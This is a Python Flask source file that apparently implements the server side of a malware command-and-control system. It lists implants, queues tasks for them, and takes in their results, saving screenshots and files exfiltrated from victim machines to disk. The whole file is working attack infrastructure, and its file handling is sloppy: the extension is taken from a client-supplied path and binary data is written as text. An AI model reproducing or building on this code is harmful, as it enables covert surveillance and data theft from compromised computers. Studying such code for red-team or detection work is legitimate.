import uuid
import json

from flask import request, Response
from flask_restful import Resource
from database.db import initialize_db
from database.models import Task, Result, Implant
from flask_jwt_extended import jwt_required, get_jwt_identity
import base64
from io import BytesIO
from PIL import Image


class Tasks(Resource):
    # ListTasks
    @jwt_required()
    def get(self):
        implant_id = get_jwt_identity()

        if implant_id:
            Tasks = Task.objects(implant_id=str(implant_id)).to_json()
            return Response(Tasks, mimetype="application/json", status=200)
        else:
            return Response("Unauthorized", mimetype="application/json", status=401)

    # AddTasks
    @jwt_required()
    def post(self):
        print("POST")
        username = get_jwt_identity()
        
        if not username:
            return Response("Unauthorized", mimetype="application/json", status=401)
        body = request.get_json()
        obj_nbr = len(body)
        for i in range(len(body)):
            body[i]['task_id'] = str(uuid.uuid4())
            Task(**body[i]).save()
            
            
        return Response(Task.objects.skip(Task.objects.count() - obj_nbr).to_json(), mimetype="application/json", status=201)
        
        
class Results(Resource):
    @jwt_required()
    def get(self):
        username = get_jwt_identity()
        implant_id = request.args.get('implant_id')
        print(implant_id)
        if username:
            res = Result.objects(implant_id=str(implant_id)).to_json()
            return Response(res, mimetype="application/json", status=200)
        else:
            return Response("Unauthorized", mimetype="application/json", status=401)
    
    @jwt_required()
    def post(self):
        implant_id = get_jwt_identity()
        body = request.get_json()
        print(body['task_id'])
        
        if not implant_id:
            return Response("Unauthorized", mimetype="application/json", status=401)
        if 'task_id' not in body:
            return Response("Task ID not provided", mimetype="application/json", status=400)
        body['implant_id'] = str(implant_id)
        
        task = Task.objects(task_id=body['task_id']).first()
        if not task:
            return Response("Task ID not found", mimetype="application/json", status=404)
        
        if task.task_type == "screenshot":
            imageString = body['result']
            img_bytes = base64.b64decode(imageString)
            img = Image.open(BytesIO(img_bytes))
            img.save(f"images/{task.task_id}.png")
        elif task.task_type == "upload":
            fileString= body['result']['file_data']
            file_bytes = base64.b64decode(fileString)
            extention= body['result']['file_path'].split('.')[-1]

            with open(f"uploads/{task.task_id}.{extention}", "w") as f:
                f.write(file_bytes.decode())
                
        
        
        body['task_obj'] = task.to_json()
        task.delete()
        
        res = Result(**body).save()
        
        return Response(res.to_json(), mimetype="application/json", status=200)
        
class implants(Resource):
    @jwt_required()
    def get(self):
        res = Implant.objects.to_json()  
        
        return Response(res, mimetype="application/json", status=200)


        